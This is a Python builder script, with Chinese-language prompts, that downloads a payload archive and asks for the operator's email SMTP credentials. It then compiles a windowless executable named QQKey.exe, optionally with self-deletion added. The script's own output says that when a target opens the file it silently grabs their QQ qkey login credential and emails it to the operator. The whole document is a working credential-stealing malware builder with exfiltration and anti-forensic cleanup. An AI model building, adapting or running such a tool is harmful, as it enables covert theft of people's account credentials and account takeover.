from webbrowser import open as web_open
import hashlib
import os
import zipfile
from time import sleep
import sys
import base64
if os.path.basename(sys.executable) != 'python.exe':
    os.chdir(os.path.dirname(sys.executable))
def encrypt(fpath: str, algorithm: str) -> str:
    with open(fpath, 'rb') as f:
        return hashlib.new(algorithm, f.read()).hexdigest()
if not os.path.isfile("Tools.zip"):
    print("请打开浏览器下载搭建文件并将文件复制到程序目录下")
    print("按下回车打开下载页面...")
    input()
    web_open("https://wwo.lanzoum.com/ixA9K1wvft2b")
    print("等待下载完成(将文件复制到本目录后自动继续)...")
    while not os.path.isfile('Tools.zip'):
        pass
sleep(1)
print("正在验证文件完整性...")
print(encrypt('Tools.zip', 'md5'))
if encrypt('Tools.zip', 'md5') == '65e83fcb0f3a0f6729d24a24794eefb5':
    print('成功')
else:
    print("失败,请删除文件打开工具下载搭建文件!")
    input()
    sys.exit(0)
print("正在释放文件...")
with open("tlds-alpha-by-domain.txt",'wb') as f:
    f.write(base64.b64decode("IyBWZXJzaW9uIDIwMjQwNDE3MDAsIExhc3QgVXBkYXRlZCBXZWQgQXByIDE3IDA3OjA3OjAxIDIwMjQgVVRDCkFBQQpBQVJQCkFCQgpBQkJPVFQKQUJCVklFCkFCQwpBQkxFCkFCT0dBRE8KQUJVREhBQkkKQUMKQUNBREVNWQpBQ0NFTlRVUkUKQUNDT1VOVEFOVApBQ0NPVU5UQU5UUwpBQ08KQUNUT1IKQUQKQURTCkFEVUxUCkFFCkFFRwpBRVJPCkFFVE5BCkFGCkFGTApBRlJJQ0EKQUcKQUdBS0hBTgpBR0VOQ1kKQUkKQUlHCkFJUkJVUwpBSVJGT1JDRQpBSVJURUwKQUtETgpBTApBTElCQUJBCkFMSVBBWQpBTExGSU5BTloKQUxMU1RBVEUKQUxMWQpBTFNBQ0UKQUxTVE9NCkFNCkFNQVpPTgpBTUVSSUNBTkVYUFJFU1MKQU1FUklDQU5GQU1JTFkKQU1FWApBTUZBTQpBTUlDQQpBTVNURVJEQU0KQU5BTFlUSUNTCkFORFJPSUQKQU5RVUFOCkFOWgpBTwpBT0wKQVBBUlRNRU5UUwpBUFAKQVBQTEUKQVEKQVFVQVJFTExFCkFSCkFSQUIKQVJBTUNPCkFSQ0hJCkFSTVkKQVJQQQpBUlQKQVJURQpBUwpBU0RBCkFTSUEKQVNTT0NJQVRFUwpBVApBVEhMRVRBCkFUVE9STkVZCkFVCkFVQ1RJT04KQVVESQpBVURJQkxFCkFVRElPCkFVU1BPU1QKQVVUSE9SCkFVVE8KQVVUT1MKQVcKQVdTCkFYCkFYQQpBWgpBWlVSRQpCQQpCQUJZCkJBSURVCkJBTkFNRVgKQkFORApCQU5LCkJBUgpCQVJDRUxPTkEKQkFSQ0xBWUNBUkQKQkFSQ0xBWVMKQkFSRUZPT1QKQkFSR0FJTlMKQkFTRUJBTEwKQkFTS0VUQkFMTApCQVVIQVVTCkJBWUVSTgpCQgpCQkMKQkJUCkJCVkEKQkNHCkJDTgpCRApCRQpCRUFUUwpCRUFVVFkKQkVFUgpCRU5UTEVZCkJFUkxJTgpCRVNUCkJFU1RCVVkKQkVUCkJGCkJHCkJICkJIQVJUSQpCSQpCSUJMRQpCSUQKQklLRQpCSU5HCkJJTkdPCkJJTwpCSVoKQkoKQkxBQ0sKQkxBQ0tGUklEQVkKQkxPQ0tCVVNURVIKQkxPRwpCTE9PTUJFUkcKQkxVRQpCTQpCTVMKQk1XCkJOCkJOUFBBUklCQVMKQk8KQk9BVFMKQk9FSFJJTkdFUgpCT0ZBCkJPTQpCT05ECkJPTwpCT09LCkJPT0tJTkcKQk9TQ0gKQk9TVElLCkJPU1RPTgpCT1QKQk9VVElRVUUKQk9YCkJSCkJSQURFU0NPCkJSSURHRVNUT05FCkJST0FEV0FZCkJST0tFUgpCUk9USEVSCkJSVVNTRUxTCkJTCkJUCkJVSUxECkJVSUxERVJTCkJVU0lORVNTCkJVWQpCVVpaCkJWCkJXCkJZCkJaCkJaSApDQQpDQUIKQ0FGRQpDQUwKQ0FMTApDQUxWSU5LTEVJTgpDQU0KQ0FNRVJBCkNBTVAKQ0FOT04KQ0FQRVRPV04KQ0FQSVRBTApDQVBJVEFMT05FCkNBUgpDQVJBVkFOCkNBUkRTCkNBUkUKQ0FSRUVSCkNBUkVFUlMKQ0FSUwpDQVNBCkNBU0UKQ0FTSApDQVNJTk8KQ0FUCkNBVEVSSU5HCkNBVEhPTElDCkNCQQpDQk4KQ0JSRQpDQwpDRApDRU5URVIKQ0VPCkNFUk4KQ0YKQ0ZBCkNGRApDRwpDSApDSEFORUwKQ0hBTk5FTApDSEFSSVRZCkNIQVNFCkNIQVQKQ0hFQVAKQ0hJTlRBSQpDSFJJU1RNQVMKQ0hST01FCkNIVVJDSApDSQpDSVBSSUFOSQpDSVJDTEUKQ0lTQ08KQ0lUQURFTApDSVRJCkNJVElDCkNJVFkKQ0sKQ0wKQ0xBSU1TCkNMRUFOSU5HCkNMSUNLCkNMSU5JQwpDTElOSVFVRQpDTE9USElORwpDTE9VRApDTFVCCkNMVUJNRUQKQ00KQ04KQ08KQ09BQ0gKQ09ERVMKQ09GRkVFCkNPTExFR0UKQ09MT0dORQpDT00KQ09NTUJBTksKQ09NTVVOSVRZCkNPTVBBTlkKQ09NUEFSRQpDT01QVVRFUgpDT01TRUMKQ09ORE9TCkNPTlNUUlVDVElPTgpDT05TVUxUSU5HCkNPTlRBQ1QKQ09OVFJBQ1RPUlMKQ09PS0lORwpDT09MCkNPT1AKQ09SU0lDQQpDT1VOVFJZCkNPVVBPTgpDT1VQT05TCkNPVVJTRVMKQ1BBCkNSCkNSRURJVApDUkVESVRDQVJECkNSRURJVFVOSU9OCkNSSUNLRVQKQ1JPV04KQ1JTCkNSVUlTRQpDUlVJU0VTCkNVCkNVSVNJTkVMTEEKQ1YKQ1cKQ1gKQ1kKQ1lNUlUKQ1lPVQpDWgpEQUJVUgpEQUQKREFOQ0UKREFUQQpEQVRFCkRBVElORwpEQVRTVU4KREFZCkRDTEsKRERTCkRFCkRFQUwKREVBTEVSCkRFQUxTCkRFR1JFRQpERUxJVkVSWQpERUxMCkRFTE9JVFRFCkRFTFRBCkRFTU9DUkFUCkRFTlRBTApERU5USVNUCkRFU0kKREVTSUdOCkRFVgpESEwKRElBTU9ORFMKRElFVApESUdJVEFMCkRJUkVDVApESVJFQ1RPUlkKRElTQ09VTlQKRElTQ09WRVIKRElTSApESVkKREoKREsKRE0KRE5QCkRPCkRPQ1MKRE9DVE9SCkRPRwpET01BSU5TCkRPVApET1dOTE9BRApEUklWRQpEVFYKRFVCQUkKRFVOTE9QCkRVUE9OVApEVVJCQU4KRFZBRwpEVlIKRFoKRUFSVEgKRUFUCkVDCkVDTwpFREVLQQpFRFUKRURVQ0FUSU9OCkVFCkVHCkVNQUlMCkVNRVJDSwpFTkVSR1kKRU5HSU5FRVIKRU5HSU5FRVJJTkcKRU5URVJQUklTRVMKRVBTT04KRVFVSVBNRU5UCkVSCkVSSUNTU09OCkVSTkkKRVMKRVNRCkVTVEFURQpFVApFVQpFVVJPVklTSU9OCkVVUwpFVkVOVFMKRVhDSEFOR0UKRVhQRVJUCkVYUE9TRUQKRVhQUkVTUwpFWFRSQVNQQUNFCkZBR0UKRkFJTApGQUlSV0lORFMKRkFJVEgKRkFNSUxZCkZBTgpGQU5TCkZBUk0KRkFSTUVSUwpGQVNISU9OCkZBU1QKRkVERVgKRkVFREJBQ0sKRkVSUkFSSQpGRVJSRVJPCkZJCkZJREVMSVRZCkZJRE8KRklMTQpGSU5BTApGSU5BTkNFCkZJTkFOQ0lBTApGSVJFCkZJUkVTVE9ORQpGSVJNREFMRQpGSVNICkZJU0hJTkcKRklUCkZJVE5FU1MKRkoKRksKRkxJQ0tSCkZMSUdIVFMKRkxJUgpGTE9SSVNUCkZMT1dFUlMKRkxZCkZNCkZPCkZPTwpGT09ECkZPT1RCQUxMCkZPUkQKRk9SRVgKRk9SU0FMRQpGT1JVTQpGT1VOREFUSU9OCkZPWApGUgpGUkVFCkZSRVNFTklVUwpGUkwKRlJPR0FOUwpGUk9OVElFUgpGVFIKRlVKSVRTVQpGVU4KRlVORApGVVJOSVRVUkUKRlVUQk9MCkZZSQpHQQpHQUwKR0FMTEVSWQpHQUxMTwpHQUxMVVAKR0FNRQpHQU1FUwpHQVAKR0FSREVOCkdBWQpHQgpHQklaCkdECkdETgpHRQpHRUEKR0VOVApHRU5USU5HCkdFT1JHRQpHRgpHRwpHR0VFCkdICkdJCkdJRlQKR0lGVFMKR0lWRVMKR0lWSU5HCkdMCkdMQVNTCkdMRQpHTE9CQUwKR0xPQk8KR00KR01BSUwKR01CSApHTU8KR01YCkdOCkdPREFERFkKR09MRApHT0xEUE9JTlQKR09MRgpHT08KR09PRFlFQVIKR09PRwpHT09HTEUKR09QCkdPVApHT1YKR1AKR1EKR1IKR1JBSU5HRVIKR1JBUEhJQ1MKR1JBVElTCkdSRUVOCkdSSVBFCkdST0NFUlkKR1JPVVAKR1MKR1QKR1UKR1VDQ0kKR1VHRQpHVUlERQpHVUlUQVJTCkdVUlUKR1cKR1kKSEFJUgpIQU1CVVJHCkhBTkdPVVQKSEFVUwpIQk8KSERGQwpIREZDQkFOSwpIRUFMVEgKSEVBTFRIQ0FSRQpIRUxQCkhFTFNJTktJCkhFUkUKSEVSTUVTCkhJUEhPUApISVNBTUlUU1UKSElUQUNISQpISVYKSEsKSEtUCkhNCkhOCkhPQ0tFWQpIT0xESU5HUwpIT0xJREFZCkhPTUVERVBPVApIT01FR09PRFMKSE9NRVMKSE9NRVNFTlNFCkhPTkRBCkhPUlNFCkhPU1BJVEFMCkhPU1QKSE9TVElORwpIT1QKSE9URUxTCkhPVE1BSUwKSE9VU0UKSE9XCkhSCkhTQkMKSFQKSFUKSFVHSEVTCkhZQVRUCkhZVU5EQUkKSUJNCklDQkMKSUNFCklDVQpJRApJRQpJRUVFCklGTQpJS0FOTwpJTApJTQpJTUFNQVQKSU1EQgpJTU1PCklNTU9CSUxJRU4KSU4KSU5DCklORFVTVFJJRVMKSU5GSU5JVEkKSU5GTwpJTkcKSU5LCklOU1RJVFVURQpJTlNVUkFOQ0UKSU5TVVJFCklOVApJTlRFUk5BVElPTkFMCklOVFVJVApJTlZFU1RNRU5UUwpJTwpJUElSQU5HQQpJUQpJUgpJUklTSApJUwpJU01BSUxJCklTVApJU1RBTkJVTApJVApJVEFVCklUVgpKQUdVQVIKSkFWQQpKQ0IKSkUKSkVFUApKRVRaVApKRVdFTFJZCkpJTwpKTEwKSk0KSk1QCkpOSgpKTwpKT0JTCkpPQlVSRwpKT1QKSk9ZCkpQCkpQTU9SR0FOCkpQUlMKSlVFR09TCkpVTklQRVIKS0FVRkVOCktEREkKS0UKS0VSUllIT1RFTFMKS0VSUllMT0dJU1RJQ1MKS0VSUllQUk9QRVJUSUVTCktGSApLRwpLSApLSQpLSUEKS0lEUwpLSU0KS0lORExFCktJVENIRU4KS0lXSQpLTQpLTgpLT0VMTgpLT01BVFNVCktPU0hFUgpLUApLUE1HCktQTgpLUgpLUkQKS1JFRApLVU9LR1JPVVAKS1cKS1kKS1lPVE8KS1oKTEEKTEFDQUlYQQpMQU1CT1JHSElOSQpMQU1FUgpMQU5DQVNURVIKTEFORApMQU5EUk9WRVIKTEFOWEVTUwpMQVNBTExFCkxBVApMQVRJTk8KTEFUUk9CRQpMQVcKTEFXWUVSCkxCCkxDCkxEUwpMRUFTRQpMRUNMRVJDCkxFRlJBSwpMRUdBTApMRUdPCkxFWFVTCkxHQlQKTEkKTElETApMSUZFCkxJRkVJTlNVUkFOQ0UKTElGRVNUWUxFCkxJR0hUSU5HCkxJS0UKTElMTFkKTElNSVRFRApMSU1PCkxJTkNPTE4KTElOSwpMSVBTWQpMSVZFCkxJVklORwpMSwpMTEMKTExQCkxPQU4KTE9BTlMKTE9DS0VSCkxPQ1VTCkxPTApMT05ET04KTE9UVEUKTE9UVE8KTE9WRQpMUEwKTFBMRklOQU5DSUFMCkxSCkxTCkxUCkxURApMVERBCkxVCkxVTkRCRUNLCkxVWEUKTFVYVVJZCkxWCkxZCk1BCk1BRFJJRApNQUlGCk1BSVNPTgpNQUtFVVAKTUFOCk1BTkFHRU1FTlQKTUFOR08KTUFQCk1BUktFVApNQVJLRVRJTkcKTUFSS0VUUwpNQVJSSU9UVApNQVJTSEFMTFMKTUFUVEVMCk1CQQpNQwpNQ0tJTlNFWQpNRApNRQpNRUQKTUVESUEKTUVFVApNRUxCT1VSTkUKTUVNRQpNRU1PUklBTApNRU4KTUVOVQpNRVJDS01TRApNRwpNSApNSUFNSQpNSUNST1NPRlQKTUlMCk1JTkkKTUlOVApNSVQKTUlUU1VCSVNISQpNSwpNTApNTEIKTUxTCk1NCk1NQQpNTgpNTwpNT0JJCk1PQklMRQpNT0RBCk1PRQpNT0kKTU9NCk1PTkFTSApNT05FWQpNT05TVEVSCk1PUk1PTgpNT1JUR0FHRQpNT1NDT1cKTU9UTwpNT1RPUkNZQ0xFUwpNT1YKTU9WSUUKTVAKTVEKTVIKTVMKTVNECk1UCk1UTgpNVFIKTVUKTVVTRVVNCk1VU0lDCk1WCk1XCk1YCk1ZCk1aCk5BCk5BQgpOQUdPWUEKTkFNRQpOQVRVUkEKTkFWWQpOQkEKTkMKTkUKTkVDCk5FVApORVRCQU5LCk5FVEZMSVgKTkVUV09SSwpORVVTVEFSCk5FVwpORVdTCk5FWFQKTkVYVERJUkVDVApORVhVUwpORgpORkwKTkcKTkdPCk5ISwpOSQpOSUNPCk5JS0UKTklLT04KTklOSkEKTklTU0FOCk5JU1NBWQpOTApOTwpOT0tJQQpOT1JUT04KTk9XCk5PV1JVWgpOT1dUVgpOUApOUgpOUkEKTlJXCk5UVApOVQpOWUMKTloKT0JJCk9CU0VSVkVSCk9GRklDRQpPS0lOQVdBCk9MQVlBTgpPTEFZQU5HUk9VUApPTExPCk9NCk9NRUdBCk9ORQpPTkcKT05MCk9OTElORQpPT08KT1BFTgpPUkFDTEUKT1JBTkdFCk9SRwpPUkdBTklDCk9SSUdJTlMKT1NBS0EKT1RTVUtBCk9UVApPVkgKUEEKUEFHRQpQQU5BU09OSUMKUEFSSVMKUEFSUwpQQVJUTkVSUwpQQVJUUwpQQVJUWQpQQVkKUENDVwpQRQpQRVQKUEYKUEZJWkVSClBHClBIClBIQVJNQUNZClBIRApQSElMSVBTClBIT05FClBIT1RPClBIT1RPR1JBUEhZClBIT1RPUwpQSFlTSU8KUElDUwpQSUNURVQKUElDVFVSRVMKUElEClBJTgpQSU5HClBJTksKUElPTkVFUgpQSVpaQQpQSwpQTApQTEFDRQpQTEFZClBMQVlTVEFUSU9OClBMVU1CSU5HClBMVVMKUE0KUE4KUE5DClBPSEwKUE9LRVIKUE9MSVRJRQpQT1JOClBPU1QKUFIKUFJBTUVSSUNBClBSQVhJClBSRVNTClBSSU1FClBSTwpQUk9EClBST0RVQ1RJT05TClBST0YKUFJPR1JFU1NJVkUKUFJPTU8KUFJPUEVSVElFUwpQUk9QRVJUWQpQUk9URUNUSU9OClBSVQpQUlVERU5USUFMClBTClBUClBVQgpQVwpQV0MKUFkKUUEKUVBPTgpRVUVCRUMKUVVFU1QKUkFDSU5HClJBRElPClJFClJFQUQKUkVBTEVTVEFURQpSRUFMVE9SClJFQUxUWQpSRUNJUEVTClJFRApSRURTVE9ORQpSRURVTUJSRUxMQQpSRUhBQgpSRUlTRQpSRUlTRU4KUkVJVApSRUxJQU5DRQpSRU4KUkVOVApSRU5UQUxTClJFUEFJUgpSRVBPUlQKUkVQVUJMSUNBTgpSRVNUClJFU1RBVVJBTlQKUkVWSUVXClJFVklFV1MKUkVYUk9USApSSUNIClJJQ0hBUkRMSQpSSUNPSApSSUwKUklPClJJUApSTwpST0NLUwpST0RFTwpST0dFUlMKUk9PTQpSUwpSU1ZQClJVClJVR0JZClJVSFIKUlVOClJXClJXRQpSWVVLWVUKU0EKU0FBUkxBTkQKU0FGRQpTQUZFVFkKU0FLVVJBClNBTEUKU0FMT04KU0FNU0NMVUIKU0FNU1VORwpTQU5EVklLClNBTkRWSUtDT1JPTUFOVApTQU5PRkkKU0FQClNBUkwKU0FTClNBVkUKU0FYTwpTQgpTQkkKU0JTClNDClNDQgpTQ0hBRUZGTEVSClNDSE1JRFQKU0NIT0xBUlNISVBTClNDSE9PTApTQ0hVTEUKU0NIV0FSWgpTQ0lFTkNFClNDT1QKU0QKU0UKU0VBUkNIClNFQVQKU0VDVVJFClNFQ1VSSVRZClNFRUsKU0VMRUNUClNFTkVSClNFUlZJQ0VTClNFVkVOClNFVwpTRVgKU0VYWQpTRlIKU0cKU0gKU0hBTkdSSUxBClNIQVJQClNIQVcKU0hFTEwKU0hJQQpTSElLU0hBClNIT0VTClNIT1AKU0hPUFBJTkcKU0hPVUpJClNIT1cKU0kKU0lMSwpTSU5BClNJTkdMRVMKU0lURQpTSgpTSwpTS0kKU0tJTgpTS1kKU0tZUEUKU0wKU0xJTkcKU00KU01BUlQKU01JTEUKU04KU05DRgpTTwpTT0NDRVIKU09DSUFMClNPRlRCQU5LClNPRlRXQVJFClNPSFUKU09MQVIKU09MVVRJT05TClNPTkcKU09OWQpTT1kKU1BBClNQQUNFClNQT1JUClNQT1QKU1IKU1JMClNTClNUClNUQURBClNUQVBMRVMKU1RBUgpTVEFURUJBTksKU1RBVEVGQVJNClNUQwpTVENHUk9VUApTVE9DS0hPTE0KU1RPUkFHRQpTVE9SRQpTVFJFQU0KU1RVRElPClNUVURZClNUWUxFClNVClNVQ0tTClNVUFBMSUVTClNVUFBMWQpTVVBQT1JUClNVUkYKU1VSR0VSWQpTVVpVS0kKU1YKU1dBVENIClNXSVNTClNYClNZClNZRE5FWQpTWVNURU1TClNaClRBQgpUQUlQRUkKVEFMSwpUQU9CQU8KVEFSR0VUClRBVEFNT1RPUlMKVEFUQVIKVEFUVE9PClRBWApUQVhJClRDClRDSQpURApUREsKVEVBTQpURUNIClRFQ0hOT0xPR1kKVEVMClRFTUFTRUsKVEVOTklTClRFVkEKVEYKVEcKVEgKVEhEClRIRUFURVIKVEhFQVRSRQpUSUFBClRJQ0tFVFMKVElFTkRBClRJUFMKVElSRVMKVElST0wKVEoKVEpNQVhYClRKWApUSwpUS01BWFgKVEwKVE0KVE1BTEwKVE4KVE8KVE9EQVkKVE9LWU8KVE9PTFMKVE9QClRPUkFZClRPU0hJQkEKVE9UQUwKVE9VUlMKVE9XTgpUT1lPVEEKVE9ZUwpUUgpUUkFERQpUUkFESU5HClRSQUlOSU5HClRSQVZFTApUUkFWRUxFUlMKVFJBVkVMRVJTSU5TVVJBTkNFClRSVVNUClRSVgpUVApUVUJFClRVSQpUVU5FUwpUVVNIVQpUVgpUVlMKVFcKVFoKVUEKVUJBTksKVUJTClVHClVLClVOSUNPTQpVTklWRVJTSVRZClVOTwpVT0wKVVBTClVTClVZClVaClZBClZBQ0FUSU9OUwpWQU5BClZBTkdVQVJEClZDClZFClZFR0FTClZFTlRVUkVTClZFUklTSUdOClZFUlNJQ0hFUlVORwpWRVQKVkcKVkkKVklBSkVTClZJREVPClZJRwpWSUtJTkcKVklMTEFTClZJTgpWSVAKVklSR0lOClZJU0EKVklTSU9OClZJVkEKVklWTwpWTEFBTkRFUkVOClZOClZPREtBClZPTFZPClZPVEUKVk9USU5HClZPVE8KVk9ZQUdFClZVCldBTEVTCldBTE1BUlQKV0FMVEVSCldBTkcKV0FOR0dPVQpXQVRDSApXQVRDSEVTCldFQVRIRVIKV0VBVEhFUkNIQU5ORUwKV0VCQ0FNCldFQkVSCldFQlNJVEUKV0VECldFRERJTkcKV0VJQk8KV0VJUgpXRgpXSE9TV0hPCldJRU4KV0lLSQpXSUxMSUFNSElMTApXSU4KV0lORE9XUwpXSU5FCldJTk5FUlMKV01FCldPTFRFUlNLTFVXRVIKV09PRFNJREUKV09SSwpXT1JLUwpXT1JMRApXT1cKV1MKV1RDCldURgpYQk9YClhFUk9YClhJSFVBTgpYSU4KWE4tLTExQjRDM0QKWE4tLTFDSzJFMUIKWE4tLTFRUVcyM0EKWE4tLTJTQ1JKOUMKWE4tLTMwUlI3WQpYTi0tM0JTVDAwTQpYTi0tM0RTNDQzRwpYTi0tM0UwQjcwN0UKWE4tLTNIQ1JKOUMKWE4tLTNQWFU4SwpYTi0tNDJDMkQ5QQpYTi0tNDVCUjVDWUwKWE4tLTQ1QlJKOUMKWE4tLTQ1UTExQwpYTi0tNERCUkswQ0UKWE4tLTRHQlJJTQpYTi0tNTRCN0ZUQTBDQwpYTi0tNTVRVzQyRwpYTi0tNTVRWDVEClhOLS01U1UzNEo5MzZCR1NHClhOLS01VFpNNUcKWE4tLTZGUlo4MkcKWE4tLTZRUTk4NkIzWEwKWE4tLTgwQURYSEtTClhOLS04MEFPMjFBClhOLS04MEFRRUNEUjFBClhOLS04MEFTRUhEQgpYTi0tODBBU1dHClhOLS04WTBBMDYzQQpYTi0tOTBBM0FDClhOLS05MEFFClhOLS05MEFJUwpYTi0tOURCUTJBClhOLS05RVQ1MlUKWE4tLTlLUlQwMEEKWE4tLUI0VzYwNUZFUkQKWE4tLUJDSzFCOUE1RFJFNEMKWE4tLUMxQVZHClhOLS1DMkJSN0cKWE4tLUNDSzJCM0IKWE4tLUNDS1dDWEVURApYTi0tQ0c0QktJClhOLS1DTENIQzBFQTBCMkcyQTlHQ0QKWE4tLUNaUjY5NEIKWE4tLUNaUlMwVApYTi0tQ1pSVTJEClhOLS1EMUFDSjNCClhOLS1EMUFMRgpYTi0tRTFBNEMKWE4tLUVDS1ZEVEM5RApYTi0tRUZWWTg4SApYTi0tRkNUNDI5SwpYTi0tRkhCRUkKWE4tLUZJUTIyOEM1SFMKWE4tLUZJUTY0QgpYTi0tRklRUzhTClhOLS1GSVFaOVMKWE4tLUZKUTcyMEEKWE4tLUZMVzM1MUUKWE4tLUZQQ1JKOUMzRApYTi0tRlpDMkM5RTJDClhOLS1GWllTOEQ2OVVWR00KWE4tLUcyWFg0OEMKWE4tLUdDS1IzRjBGClhOLS1HRUNSSjlDClhOLS1HSzNBVDFFClhOLS1IMkJSRUczRVZFClhOLS1IMkJSSjlDClhOLS1IMkJSSjlDOEMKWE4tLUhYVDgxNEUKWE4tLUkxQjZCMUE2QTJFClhOLS1JTVI1MTNOClhOLS1JTzBBN0kKWE4tLUoxQUVGClhOLS1KMUFNSApYTi0tSjZXMTkzRwpYTi0tSkxRNDgwTjJSRwpYTi0tSlZSMTg5TQpYTi0tS0NSWDc3RDFYNEEKWE4tLUtQUlcxM0QKWE4tLUtQUlk1N0QKWE4tLUtQVVQzSQpYTi0tTDFBQ0MKWE4tLUxHQkJBVDFBRDhKClhOLS1NR0I5QVdCRgpYTi0tTUdCQTNBM0VKVApYTi0tTUdCQTNBNEYxNkEKWE4tLU1HQkE3QzBCQk4wQQpYTi0tTUdCQUFNN0E4SApYTi0tTUdCQUIyQkQKWE4tLU1HQkFIMUEzSEpLUkQKWE4tLU1HQkFJOUFaR1FQNkoKWE4tLU1HQkFZSDdHUEEKWE4tLU1HQkJIMUEKWE4tLU1HQkJIMUE3MUUKWE4tLU1HQkMwQTlBWkNHClhOLS1NR0JDQTdEWkRPClhOLS1NR0JDUFE2R1BBMUEKWE4tLU1HQkVSUDRBNUQ0QVIKWE4tLU1HQkdVODJBClhOLS1NR0JJNEVDRVhQClhOLS1NR0JQTDJGSApYTi0tTUdCVDNESEQKWE4tLU1HQlRYMkIKWE4tLU1HQlg0Q0QwQUIKWE4tLU1JWDg5MUYKWE4tLU1LMUJVNDRDClhOLS1NWFRRMU0KWE4tLU5HQkM1QVpEClhOLS1OR0JFOUUwQQpYTi0tTkdCUlgKWE4tLU5PREUKWE4tLU5RVjdGClhOLS1OUVY3RlMwMEVNQQpYTi0tTllRWTI2QQpYTi0tTzNDVzRIClhOLS1PR0JQRjhGTApYTi0tT1RVNzk2RApYTi0tUDFBQ0YKWE4tLVAxQUkKWE4tLVBHQlMwREgKWE4tLVBTU1kyVQpYTi0tUTdDRTZBClhOLS1ROUpZQjRDClhOLS1RQ0tBMVBNQwpYTi0tUVhBNkEKWE4tLVFYQU0KWE4tLVJIUVY5NkcKWE4tLVJPVlU4OEIKWE4tLVJWQzFFMEFNM0UKWE4tLVM5QlJKOUMKWE4tLVNFUzU1NEcKWE4tLVQ2MEI1NkEKWE4tLVRDS1dFClhOLS1USVE0OVhRWUoKWE4tLVVOVVA0WQpYTi0tVkVSTUdFTlNCRVJBVEVSLUNUQgpYTi0tVkVSTUdFTlNCRVJBVFVORy1QV0IKWE4tLVZIUVVWClhOLS1WVVE4NjFCClhOLS1XNFI4NUVMOEZIVTVETlJBClhOLS1XNFJTNDBMClhOLS1XR0JIMUMKWE4tLVdHQkw2QQpYTi0tWEhRNTIxQgpYTi0tWEtDMkFMM0hZRTJBClhOLS1YS0MyREwzQTVFRTBIClhOLS1ZOUEzQVEKWE4tLVlGUk80STY3TwpYTi0tWUdCSTJBTU1YClhOLS1aRlIxNjRCClhYWApYWVoKWUFDSFRTCllBSE9PCllBTUFYVU4KWUFOREVYCllFCllPRE9CQVNISQpZT0dBCllPS09IQU1BCllPVQpZT1VUVUJFCllUCllVTgpaQQpaQVBQT1MKWkFSQQpaRVJPClpJUApaTQpaT05FClpVRVJJQ0gKWlcK".encode('utf-8')))
print("环境已准备完毕,请输入信息!")
smtp_server = f'"{input("请输入邮箱smtp地址:")}"'
smtp_port = input("请输入smtp服务器端口(看不懂请输入25):")
smtp_account = f'"{input("请输入邮箱:")}"'
smtp_password = f'"{input("请输入密码(部分邮箱需要使用特定授权码):")}"'
zip_path = '.\\Tools.zip'
# 文件存储路径
if not os.path.isdir('data'):
    os.mkdir('data')
save_path = '.\\data\\'

# 读取压缩文件
file = zipfile.ZipFile(zip_path)
# 解压文件
print('开始解压文件...')
file.extractall(save_path)
# 关闭文件流
file.close()
with open(".\\data\\qkey_code.py",'r',encoding='utf-8') as f:
    content = f.read()
content = content.replace("smtp_account",smtp_account)
content = content.replace("smtp_password",smtp_password)
content = content.replace("smtp_server",smtp_server)
content = content.replace("smtp_port",smtp_port)
if input("是否需要运行后自动自毁?[y/n]:") == 'y':
    content += r"""
import sys,os
path = sys.argv[0]
print(path)
with open("1.bat", 'w', encoding='gbk') as f:
    f.write(f"@echo off\nping -n 1 127.0.0.1>nul\ndel {path}\ndel %0")
os.startfile("1.bat")
sys.exit(0)
    """
with open(".\\qkey_code.py",'w',encoding='utf-8') as f:
    f.write(content)
print("开始下载打包所需文件(出现大量信息属于正常)...")
os.system(".\\data\\python.exe -m pip install pyinstaller -i https://pypi.tuna.tsinghua.edu.cn/simple")
os.system(".\\data\\python.exe -m pip install requests -i https://pypi.tuna.tsinghua.edu.cn/simple")
os.system(".\\data\\python.exe -m pip install urlextract -i https://pypi.tuna.tsinghua.edu.cn/simple")
os.system(".\\data\\python.exe -m pip install psutil -i https://pypi.tuna.tsinghua.edu.cn/simple")
print("开始打包...")
os.system(".\\data\\Scripts\\pyinstaller.exe -F -w --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py")
os.rename(".\\dist\\qkey_code.exe",".\\dist\\QQKey.exe")
with open(".\\dist\\QQKey.exe",'rb') as f:
    a = f.read()
os.remove(".\\dist\\QQKey.exe")
with open(".\\QQKey.exe",'wb') as f:
    f.write(a)
print("打包完毕!")
print("文件名为:QQKey.exe")
print("目标如果打开此文件将会获取qkey并发送至你的邮箱")
print("注意:运行完后程序自动删除!")
print("注意:当对方打开时程序将静默获取,并不会出现弹出窗口")
while True:
    pass